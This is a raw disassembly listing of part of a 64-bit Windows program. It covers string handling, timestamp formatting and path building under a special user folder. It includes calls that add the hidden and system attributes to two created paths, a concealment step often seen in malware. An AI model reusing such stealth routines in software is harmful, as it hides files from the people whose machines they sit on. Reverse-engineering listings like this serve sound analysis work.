   1400023fb:	e8 68 7a 00 00       	call   0x140009e68
   140002400:	48 85 c0             	test   %rax,%rax
   140002403:	0f 84 f6 00 00 00    	je     0x1400024ff
   140002409:	48 8d 78 27          	lea    0x27(%rax),%rdi
   14000240d:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140002411:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140002415:	eb 0b                	jmp    0x140002422
   140002417:	49 8b cd             	mov    %r13,%rcx
   14000241a:	e8 49 7a 00 00       	call   0x140009e68
   14000241f:	48 8b f8             	mov    %rax,%rdi
   140002422:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140002427:	4a 8d 2c 2f          	lea    (%rdi,%r13,1),%rbp
   14000242b:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140002430:	4d 8b c5             	mov    %r13,%r8
   140002433:	33 d2                	xor    %edx,%edx
   140002435:	48 8b cf             	mov    %rdi,%rcx
   140002438:	e8 53 9f 00 00       	call   0x14000c390
   14000243d:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140002442:	49 83 7e 18 08       	cmpq   $0x8,0x18(%r14)
   140002447:	72 03                	jb     0x14000244c
   140002449:	4d 8b 36             	mov    (%r14),%r14
   14000244c:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140002451:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002456:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000245b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002460:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   140002466:	4d 8b c6             	mov    %r14,%r8
   140002469:	33 d2                	xor    %edx,%edx
   14000246b:	33 c9                	xor    %ecx,%ecx
   14000246d:	ff 15 1d dc 02 00    	call   *0x2dc1d(%rip)        # 0x140030090
   140002473:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   140002477:	4c 63 c0             	movslq %eax,%r8
   14000247a:	4c 03 c7             	add    %rdi,%r8
   14000247d:	48 89 33             	mov    %rsi,(%rbx)
   140002480:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140002484:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   14000248b:	00 
   14000248c:	c6 03 00             	movb   $0x0,(%rbx)
   14000248f:	49 3b f8             	cmp    %r8,%rdi
   140002492:	74 0f                	je     0x1400024a3
   140002494:	4c 2b c7             	sub    %rdi,%r8
   140002497:	48 8b d7             	mov    %rdi,%rdx
   14000249a:	48 8b cb             	mov    %rbx,%rcx
   14000249d:	e8 ae 43 00 00       	call   0x140006850
   1400024a2:	90                   	nop
   1400024a3:	48 85 ff             	test   %rdi,%rdi
   1400024a6:	74 2f                	je     0x1400024d7
   1400024a8:	48 2b ef             	sub    %rdi,%rbp
   1400024ab:	48 81 fd 00 10 00 00 	cmp    $0x1000,%rbp
   1400024b2:	72 18                	jb     0x1400024cc
   1400024b4:	48 83 c5 27          	add    $0x27,%rbp
   1400024b8:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400024bc:	48 2b f9             	sub    %rcx,%rdi
   1400024bf:	48 8d 47 f8          	lea    -0x8(%rdi),%rax
   1400024c3:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400024c7:	77 36                	ja     0x1400024ff
   1400024c9:	48 8b f9             	mov    %rcx,%rdi
   1400024cc:	48 8b d5             	mov    %rbp,%rdx
   1400024cf:	48 8b cf             	mov    %rdi,%rcx
   1400024d2:	e8 89 79 00 00       	call   0x140009e60
   1400024d7:	48 8b c3             	mov    %rbx,%rax
   1400024da:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   1400024df:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400024e3:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   1400024e7:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400024eb:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   1400024ef:	49 8b e3             	mov    %r11,%rsp
   1400024f2:	41 5f                	pop    %r15
   1400024f4:	41 5e                	pop    %r14
   1400024f6:	41 5d                	pop    %r13
   1400024f8:	c3                   	ret
   1400024f9:	e8 a2 ed ff ff       	call   0x1400012a0
   1400024fe:	cc                   	int3
   1400024ff:	e8 1c 29 01 00       	call   0x140014e20
   140002504:	cc                   	int3
   140002505:	e8 16 5c 00 00       	call   0x140008120
   14000250a:	cc                   	int3
   14000250b:	cc                   	int3
   14000250c:	cc                   	int3
   14000250d:	cc                   	int3
   14000250e:	cc                   	int3
   14000250f:	cc                   	int3
   140002510:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140002517:	33 c9                	xor    %ecx,%ecx
   140002519:	ff 15 c1 de 02 00    	call   *0x2dec1(%rip)        # 0x1400303e0
   14000251f:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002524:	ff 15 ae de 02 00    	call   *0x2deae(%rip)        # 0x1400303d8
   14000252a:	85 c0                	test   %eax,%eax
   14000252c:	0f 85 af 00 00 00    	jne    0x1400025e1
   140002532:	0f b6 4c 24 7e       	movzbl 0x7e(%rsp),%ecx
   140002537:	0f b6 54 24 7d       	movzbl 0x7d(%rsp),%edx
   14000253c:	44 0f b6 44 24 7c    	movzbl 0x7c(%rsp),%r8d
   140002542:	44 0f b6 4c 24 7b    	movzbl 0x7b(%rsp),%r9d
   140002548:	0f b6 44 24 7f       	movzbl 0x7f(%rsp),%eax
   14000254d:	44 0f b6 54 24 7a    	movzbl 0x7a(%rsp),%r10d
   140002553:	44 0f b6 5c 24 79    	movzbl 0x79(%rsp),%r11d
   140002559:	89 44 24 68          	mov    %eax,0x68(%rsp)
   14000255d:	89 4c 24 60          	mov    %ecx,0x60(%rsp)
   140002561:	48 8d 0d 08 80 04 00 	lea    0x48008(%rip),%rcx        # 0x14004a570
   140002568:	89 54 24 58          	mov    %edx,0x58(%rsp)
   14000256c:	ba 40 00 00 00       	mov    $0x40,%edx
   140002571:	44 89 44 24 50       	mov    %r8d,0x50(%rsp)
   140002576:	4c 8d 05 73 cb 03 00 	lea    0x3cb73(%rip),%r8        # 0x14003f0f0
   14000257d:	44 89 4c 24 48       	mov    %r9d,0x48(%rsp)
   140002582:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
   140002587:	44 89 54 24 40       	mov    %r10d,0x40(%rsp)
   14000258c:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   140002591:	48 89 9c 24 90 00 00 	mov    %rbx,0x90(%rsp)
   140002598:	00 
   140002599:	0f b6 5c 24 78       	movzbl 0x78(%rsp),%ebx
   14000259e:	48 89 b4 24 98 00 00 	mov    %rsi,0x98(%rsp)
   1400025a5:	00 
   1400025a6:	0f b7 74 24 74       	movzwl 0x74(%rsp),%esi
   1400025ab:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1400025af:	48 89 bc 24 80 00 00 	mov    %rdi,0x80(%rsp)
   1400025b6:	00 
   1400025b7:	0f b7 7c 24 76       	movzwl 0x76(%rsp),%edi
   1400025bc:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   1400025c0:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400025c4:	e8 17 eb ff ff       	call   0x1400010e0
   1400025c9:	48 8b bc 24 80 00 00 	mov    0x80(%rsp),%rdi
   1400025d0:	00 
   1400025d1:	48 8b b4 24 98 00 00 	mov    0x98(%rsp),%rsi
   1400025d8:	00 
   1400025d9:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1400025e0:	00 
   1400025e1:	ff 15 e9 dd 02 00    	call   *0x2dde9(%rip)        # 0x1400303d0
   1400025e7:	48 8d 05 82 7f 04 00 	lea    0x47f82(%rip),%rax        # 0x14004a570
   1400025ee:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400025f5:	c3                   	ret
   1400025f6:	cc                   	int3
   1400025f7:	cc                   	int3
   1400025f8:	cc                   	int3
   1400025f9:	cc                   	int3
   1400025fa:	cc                   	int3
   1400025fb:	cc                   	int3
   1400025fc:	cc                   	int3
   1400025fd:	cc                   	int3
   1400025fe:	cc                   	int3
   1400025ff:	cc                   	int3
   140002600:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002605:	55                   	push   %rbp
   140002606:	56                   	push   %rsi
   140002607:	57                   	push   %rdi
   140002608:	41 56                	push   %r14
   14000260a:	41 57                	push   %r15
   14000260c:	48 8d ac 24 a0 d8 ff 	lea    -0x2760(%rsp),%rbp
   140002613:	ff 
   140002614:	b8 60 28 00 00       	mov    $0x2860,%eax
   140002619:	e8 b2 7e 00 00       	call   0x14000a4d0
   14000261e:	48 2b e0             	sub    %rax,%rsp
   140002621:	45 33 c9             	xor    %r9d,%r9d
   140002624:	45 8d 41 1c          	lea    0x1c(%r9),%r8d
   140002628:	48 8d 95 00 1b 00 00 	lea    0x1b00(%rbp),%rdx
   14000262f:	33 c9                	xor    %ecx,%ecx
   140002631:	ff 15 71 dd 02 00    	call   *0x2dd71(%rip)        # 0x1400303a8
   140002637:	e8 d4 fe ff ff       	call   0x140002510
   14000263c:	4c 8b c8             	mov    %rax,%r9
   14000263f:	4c 8d 85 00 1b 00 00 	lea    0x1b00(%rbp),%r8
   140002646:	48 8d 15 0b cb 03 00 	lea    0x3cb0b(%rip),%rdx        # 0x14003f158
   14000264d:	48 8d 8d 70 08 00 00 	lea    0x870(%rbp),%rcx
   140002654:	ff 15 5e dd 02 00    	call   *0x2dd5e(%rip)        # 0x1400303b8
   14000265a:	33 d2                	xor    %edx,%edx
   14000265c:	48 8d 8d 70 08 00 00 	lea    0x870(%rbp),%rcx
   140002663:	ff 15 87 da 02 00    	call   *0x2da87(%rip)        # 0x1400300f0
   140002669:	48 8d 95 50 04 00 00 	lea    0x450(%rbp),%rdx
   140002670:	b9 04 01 00 00       	mov    $0x104,%ecx
   140002675:	ff 15 45 da 02 00    	call   *0x2da45(%rip)        # 0x1400300c0
   14000267b:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   140002682:	e8 69 f9 ff ff       	call   0x140001ff0
   140002687:	90                   	nop
   140002688:	4c 8d 8d 20 02 00 00 	lea    0x220(%rbp),%r9
   14000268f:	48 83 bd 38 02 00 00 	cmpq   $0x8,0x238(%rbp)
   140002696:	08 
   140002697:	4c 0f 43 8d 20 02 00 	cmovae 0x220(%rbp),%r9
   14000269e:	00 
   14000269f:	4c 8d 05 c2 ca 03 00 	lea    0x3cac2(%rip),%r8        # 0x14003f168
   1400026a6:	48 8d 15 ab ca 03 00 	lea    0x3caab(%rip),%rdx        # 0x14003f158
   1400026ad:	48 8d 8d 40 02 00 00 	lea    0x240(%rbp),%rcx
   1400026b4:	e8 77 48 00 00       	call   0x140006f30
   1400026b9:	33 d2                	xor    %edx,%edx
   1400026bb:	48 8d 8d 40 02 00 00 	lea    0x240(%rbp),%rcx
   1400026c2:	ff 15 28 da 02 00    	call   *0x2da28(%rip)        # 0x1400300f0
   1400026c8:	48 8d 8d 40 02 00 00 	lea    0x240(%rbp),%rcx
   1400026cf:	ff 15 63 d9 02 00    	call   *0x2d963(%rip)        # 0x140030038
   1400026d5:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400026d8:	74 12                	je     0x1400026ec
   1400026da:	83 c8 06             	or     $0x6,%eax
   1400026dd:	8b d0                	mov    %eax,%edx
   1400026df:	48 8d 8d 40 02 00 00 	lea    0x240(%rbp),%rcx
   1400026e6:	ff 15 5c d9 02 00    	call   *0x2d95c(%rip)        # 0x140030048
   1400026ec:	4c 8d 8d 40 02 00 00 	lea    0x240(%rbp),%r9
   1400026f3:	4c 8d 05 8e ca 03 00 	lea    0x3ca8e(%rip),%r8        # 0x14003f188
   1400026fa:	ba 04 01 00 00       	mov    $0x104,%edx
   1400026ff:	48 8d 8d 60 06 00 00 	lea    0x660(%rbp),%rcx
   140002706:	e8 75 e9 ff ff       	call   0x140001080
   14000270b:	33 d2                	xor    %edx,%edx
   14000270d:	48 8d 8d 60 06 00 00 	lea    0x660(%rbp),%rcx
   140002714:	ff 15 d6 d9 02 00    	call   *0x2d9d6(%rip)        # 0x1400300f0
   14000271a:	48 8d 8d 60 06 00 00 	lea    0x660(%rbp),%rcx
   140002721:	ff 15 11 d9 02 00    	call   *0x2d911(%rip)        # 0x140030038
   140002727:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000272a:	74 12                	je     0x14000273e
   14000272c:	83 c8 06             	or     $0x6,%eax
   14000272f:	8b d0                	mov    %eax,%edx
   140002731:	48 8d 8d 60 06 00 00 	lea    0x660(%rbp),%rcx
   140002738:	ff 15 0a d9 02 00    	call   *0x2d90a(%rip)        # 0x140030048
   14000273e:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140002743:	e8 a8 f8 ff ff       	call   0x140001ff0
   140002748:	90                   	nop
   140002749:	45 33 ff             	xor    %r15d,%r15d
   14000274c:	4c 89 bd d0 00 00 00 	mov    %r15,0xd0(%rbp)
   140002753:	4c 89 bd e0 00 00 00 	mov    %r15,0xe0(%rbp)
   14000275a:	48 c7 85 e8 00 00 00 	movq   $0x7,0xe8(%rbp)
   140002761:	07 00 00 00 
   140002765:	66 44 89 bd d0 00 00 	mov    %r15w,0xd0(%rbp)
   14000276c:	00 
   14000276d:	48 8d 85 40 02 00 00 	lea    0x240(%rbp),%rax
   140002774:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   14000277b:	4c 8b c3             	mov    %rbx,%r8
   14000277e:	66 90                	xchg   %ax,%ax
   140002780:	49 ff c0             	inc    %r8
   140002783:	66 46 39 3c 40       	cmp    %r15w,(%rax,%r8,2)
   140002788:	75 f6                	jne    0x140002780
   14000278a:	48 8d 95 40 02 00 00 	lea    0x240(%rbp),%rdx
   140002791:	48 8d 8d d0 00 00 00 	lea    0xd0(%rbp),%rcx
   140002798:	e8 63 3e 00 00       	call   0x140006600
   14000279d:	90                   	nop
   14000279e:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   1400027a5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400027a9:	e8 e2 47 00 00       	call   0x140006f90
   1400027ae:	48 8b f8             	mov    %rax,%rdi
   1400027b1:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400027b6:	48 83 7c 24 68 08    	cmpq   $0x8,0x68(%rsp)
   1400027bc:	4c 0f 43 4c 24 50    	cmovae 0x50(%rsp),%r9
   1400027c2:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400027c7:	48 8b 48 10          	mov    0x10(%rax),%rcx
   1400027cb:	4c 8b 40 18          	mov    0x18(%rax),%r8
   1400027cf:	49 8b c0             	mov    %r8,%rax
   1400027d2:	48 2b c1             	sub    %rcx,%rax
   1400027d5:	48 3b d0             	cmp    %rax,%rdx
   1400027d8:	77 2b                	ja     0x140002805
   1400027da:	4c 8d 34 11          	lea    (%rcx,%rdx,1),%r14
   1400027de:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   1400027e2:	48 8b f7             	mov    %rdi,%rsi
   1400027e5:	49 83 f8 08          	cmp    $0x8,%r8
   1400027e9:	72 03                	jb     0x1400027ee
   1400027eb:	48 8b 37             	mov    (%rdi),%rsi
   1400027ee:	48 8d 0c 4e          	lea    (%rsi,%rcx,2),%rcx
   1400027f2:	4c 8d 04 12          	lea    (%rdx,%rdx,1),%r8
   1400027f6:	49 8b d1             	mov    %r9,%rdx
   1400027f9:	e8 e2 94 00 00       	call   0x14000bce0
   1400027fe:	66 46 89 3c 76       	mov    %r15w,(%rsi,%r14,2)
   140002803:	eb 10                	jmp    0x140002815
   140002805:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   14000280a:	48 8b cf             	mov    %rdi,%rcx
   14000280d:	e8 ae 55 00 00       	call   0x140007dc0
   140002812:	48 8b f8             	mov    %rax,%rdi
   140002815:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   14000281a:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   14000281f:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   140002824:	0f 10 07             	movups (%rdi),%xmm0
   140002827:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   14000282c:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   140002830:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
   140002835:	4c 89 7f 10          	mov    %r15,0x10(%rdi)
   140002839:	48 c7 47 18 07 00 00 	movq   $0x7,0x18(%rdi)
   140002840:	00 
   140002841:	66 44 89 3f          	mov    %r15w,(%rdi)
   140002845:	48 8d 15 4c c9 03 00 	lea    0x3c94c(%rip),%rdx        # 0x14003f198
   14000284c:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140002851:	e8 4a 3f 00 00       	call   0x1400067a0
   140002856:	4c 89 7d 70          	mov    %r15,0x70(%rbp)
   14000285a:	4c 89 bd 80 00 00 00 	mov    %r15,0x80(%rbp)
   140002861:	4c 89 bd 88 00 00 00 	mov    %r15,0x88(%rbp)
   140002868:	0f 10 00             	movups (%rax),%xmm0
   14000286b:	0f 11 45 70          	movups %xmm0,0x70(%rbp)
   14000286f:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002873:	0f 11 8d 80 00 00 00 	movups %xmm1,0x80(%rbp)
   14000287a:	4c 89 78 10          	mov    %r15,0x10(%rax)
   14000287e:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002885:	00 
   140002886:	66 44 89 38          	mov    %r15w,(%rax)
   14000288a:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   14000288f:	48 83 fa 08          	cmp    $0x8,%rdx
   140002893:	72 37                	jb     0x1400028cc
   140002895:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000289c:	00 
   14000289d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400028a2:	48 8b c1             	mov    %rcx,%rax
   1400028a5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400028ac:	72 19                	jb     0x1400028c7
   1400028ae:	48 83 c2 27          	add    $0x27,%rdx
   1400028b2:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400028b6:	48 2b c1             	sub    %rcx,%rax
   1400028b9:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400028bd:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400028c1:	0f 87 e5 14 00 00    	ja     0x140003dac
   1400028c7:	e8 94 75 00 00       	call   0x140009e60
   1400028cc:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   1400028d1:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   1400028d8:	00 00 
   1400028da:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   1400028e0:	48 8b 55 08          	mov    0x8(%rbp),%rdx
   1400028e4:	48 83 fa 08          	cmp    $0x8,%rdx
   1400028e8:	72 36                	jb     0x140002920
   1400028ea:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400028f1:	00 
   1400028f2:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   1400028f6:	48 8b c1             	mov    %rcx,%rax
   1400028f9:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002900:	72 19                	jb     0x14000291b
   140002902:	48 83 c2 27          	add    $0x27,%rdx
   140002906:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000290a:	48 2b c1             	sub    %rcx,%rax
   14000290d:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002911:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002915:	0f 87 97 14 00 00    	ja     0x140003db2
   14000291b:	e8 40 75 00 00       	call   0x140009e60
   140002920:	4c 89 7d 00          	mov    %r15,0x0(%rbp)
   140002924:	48 c7 45 08 07 00 00 	movq   $0x7,0x8(%rbp)
   14000292b:	00 
   14000292c:	66 44 89 7d f0       	mov    %r15w,-0x10(%rbp)
   140002931:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   140002938:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   14000293d:	e8 4e 46 00 00       	call   0x140006f90
   140002942:	90                   	nop
   140002943:	48 8d 15 5e c8 03 00 	lea    0x3c85e(%rip),%rdx        # 0x14003f1a8
   14000294a:	48 8b c8             	mov    %rax,%rcx
   14000294d:	e8 4e 3e 00 00       	call   0x1400067a0
   140002952:	4c 89 7d 50          	mov    %r15,0x50(%rbp)
   140002956:	4c 89 7d 60          	mov    %r15,0x60(%rbp)
   14000295a:	4c 89 7d 68          	mov    %r15,0x68(%rbp)
   14000295e:	0f 10 00             	movups (%rax),%xmm0
   140002961:	0f 11 45 50          	movups %xmm0,0x50(%rbp)
   140002965:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002969:	0f 11 4d 60          	movups %xmm1,0x60(%rbp)
   14000296d:	4c 89 78 10          	mov    %r15,0x10(%rax)
   140002971:	48 c7 40 18 07 00 00 	movq   $0x7,0x18(%rax)
   140002978:	00 
   140002979:	66 44 89 38          	mov    %r15w,(%rax)
   14000297d:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
   140002981:	48 83 fa 08          	cmp    $0x8,%rdx
   140002985:	72 37                	jb     0x1400029be
   140002987:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000298e:	00 
   14000298f:	48 8b 4c 24 70       	mov    0x70(%rsp),%rcx
   140002994:	48 8b c1             	mov    %rcx,%rax
   140002997:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000299e:	72 19                	jb     0x1400029b9
   1400029a0:	48 83 c2 27          	add    $0x27,%rdx
   1400029a4:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400029a8:	48 2b c1             	sub    %rcx,%rax
   1400029ab:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400029af:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400029b3:	0f 87 ff 13 00 00    	ja     0x140003db8
   1400029b9:	e8 a2 74 00 00       	call   0x140009e60
   1400029be:	4c 89 7d 80          	mov    %r15,-0x80(%rbp)
   1400029c2:	48 c7 45 88 07 00 00 	movq   $0x7,-0x78(%rbp)
   1400029c9:	00 
   1400029ca:	66 44 89 7c 24 70    	mov    %r15w,0x70(%rsp)
   1400029d0:	48 8d 95 d0 00 00 00 	lea    0xd0(%rbp),%rdx
   1400029d7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400029dc:	e8 af 45 00 00       	call   0x140006f90
   1400029e1:	48 8b f8             	mov    %rax,%rdi
   1400029e4:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   1400029e9:	48 83 7c 24 68 08    	cmpq   $0x8,0x68(%rsp)
   1400029ef:	4c 0f 43 4c 24 50    	cmovae 0x50(%rsp),%r9
   1400029f5:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   1400029fa:	48 8b 48 10          	mov    0x10(%rax),%rcx
   1400029fe:	4c 8b 40 18          	mov    0x18(%rax),%r8
   140002a02:	49 8b c0             	mov    %r8,%rax
   140002a05:	48 2b c1             	sub    %rcx,%rax
   140002a08:	48 3b d0             	cmp    %rax,%rdx
   140002a0b:	77 2b                	ja     0x140002a38
   140002a0d:	4c 8d 34 11          	lea    (%rcx,%rdx,1),%r14
   140002a11:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   140002a15:	48 8b f7             	mov    %rdi,%rsi
   140002a18:	49 83 f8 08          	cmp    $0x8,%r8
   140002a1c:	72 03                	jb     0x140002a21
   140002a1e:	48 8b 37             	mov    (%rdi),%rsi
   140002a21:	48 8d 0c 4e          	lea    (%rsi,%rcx,2),%rcx
   140002a25:	4c 8d 04 12          	lea    (%rdx,%rdx,1),%r8
   140002a29:	49 8b d1             	mov    %r9,%rdx
   140002a2c:	e8 af 92 00 00       	call   0x14000bce0
   140002a31:	66 46 89 3c 76       	mov    %r15w,(%rsi,%r14,2)
   140002a36:	eb 10                	jmp    0x140002a48
   140002a38:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002a3d:	48 8b cf             	mov    %rdi,%rcx
   140002a40:	e8 7b 53 00 00       	call   0x140007dc0
   140002a45:	48 8b f8             	mov    %rax,%rdi
   140002a48:	4c 89 7d 30          	mov    %r15,0x30(%rbp)
   140002a4c:	4c 89 7d 40          	mov    %r15,0x40(%rbp)
   140002a50:	4c 89 7d 48          	mov    %r15,0x48(%rbp)
   140002a54:	0f 10 07             	movups (%rdi),%xmm0
   140002a57:	0f 11 45 30          	movups %xmm0,0x30(%rbp)
   140002a5b:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   140002a5f:	0f 11 4d 40          	movups %xmm1,0x40(%rbp)
   140002a63:	4c 89 7f 10          	mov    %r15,0x10(%rdi)
   140002a67:	48 c7 47 18 07 00 00 	movq   $0x7,0x18(%rdi)
   140002a6e:	00 
   140002a6f:	66 44 89 3f          	mov    %r15w,(%rdi)
   140002a73:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140002a78:	48 83 fa 08          	cmp    $0x8,%rdx
   140002a7c:	72 37                	jb     0x140002ab5
   140002a7e:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002a85:	00 
   140002a86:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140002a8b:	48 8b c1             	mov    %rcx,%rax
   140002a8e:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002a95:	72 19                	jb     0x140002ab0
   140002a97:	48 83 c2 27          	add    $0x27,%rdx
   140002a9b:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002a9f:	48 2b c1             	sub    %rcx,%rax
   140002aa2:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140002aa6:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002aaa:	0f 87 0e 13 00 00    	ja     0x140003dbe
   140002ab0:	e8 ab 73 00 00       	call   0x140009e60
   140002ab5:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140002aba:	48 c7 44 24 48 07 00 	movq   $0x7,0x48(%rsp)
   140002ac1:	00 00 
   140002ac3:	66 44 89 7c 24 30    	mov    %r15w,0x30(%rsp)
   140002ac9:	4c 89 7d f0          	mov    %r15,-0x10(%rbp)
   140002acd:	4c 89 7d 00          	mov    %r15,0x0(%rbp)
   140002ad1:	48 c7 45 08 07 00 00 	movq   $0x7,0x8(%rbp)
   140002ad8:	00 
   140002ad9:	66 44 89 7d f0       	mov    %r15w,-0x10(%rbp)
   140002ade:	48 8d 85 60 06 00 00 	lea    0x660(%rbp),%rax
   140002ae5:	4c 8b c3             	mov    %rbx,%r8
   140002ae8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002aef:	00 
   140002af0:	49 ff c0             	inc    %r8
   140002af3:	66 42 83 3c 40 00    	cmpw   $0x0,(%rax,%r8,2)
   140002af9:	75 f5                	jne    0x140002af0
   140002afb:	48 8d 95 60 06 00 00 	lea    0x660(%rbp),%rdx
   140002b02:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002b06:	e8 f5 3a 00 00       	call   0x140006600
   140002b0b:	90                   	nop
   140002b0c:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140002b10:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002b15:	e8 76 44 00 00       	call   0x140006f90
   140002b1a:	48 8b f8             	mov    %rax,%rdi
   140002b1d:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140002b22:	48 83 7c 24 68 08    	cmpq   $0x8,0x68(%rsp)
   140002b28:	4c 0f 43 4c 24 50    	cmovae 0x50(%rsp),%r9
   140002b2e:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140002b33:	48 8b 48 10          	mov    0x10(%rax),%rcx
   140002b37:	4c 8b 40 18          	mov    0x18(%rax),%r8
   140002b3b:	49 8b c0             	mov    %r8,%rax
   140002b3e:	48 2b c1             	sub    %rcx,%rax
   140002b41:	48 3b d0             	cmp    %rax,%rdx
   140002b44:	77 2b                	ja     0x140002b71
   140002b46:	4c 8d 34 11          	lea    (%rcx,%rdx,1),%r14
   140002b4a:	4c 89 77 10          	mov    %r14,0x10(%rdi)
   140002b4e:	48 8b f7             	mov    %rdi,%rsi
   140002b51:	49 83 f8 08          	cmp    $0x8,%r8
   140002b55:	72 03                	jb     0x140002b5a
   140002b57:	48 8b 37             	mov    (%rdi),%rsi
   140002b5a:	48 8d 0c 4e          	lea    (%rsi,%rcx,2),%rcx
   140002b5e:	4c 8d 04 12          	lea    (%rdx,%rdx,1),%r8
   140002b62:	49 8b d1             	mov    %r9,%rdx
   140002b65:	e8 76 91 00 00       	call   0x14000bce0
   140002b6a:	66 46 89 3c 76       	mov    %r15w,(%rsi,%r14,2)
   140002b6f:	eb 10                	jmp    0x140002b81
   140002b71:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140002b76:	48 8b cf             	mov    %rdi,%rcx
   140002b79:	e8 42 52 00 00       	call   0x140007dc0
   140002b7e:	48 8b f8             	mov    %rax,%rdi
   140002b81:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140002b86:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   140002b8b:	4c 89 7c 24 48       	mov    %r15,0x48(%rsp)
   140002b90:	0f 10 07             	movups (%rdi),%xmm0
   140002b93:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002b98:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   140002b9c:	0f 11 4c 24 40       	movups %xmm1,0x40(%rsp)
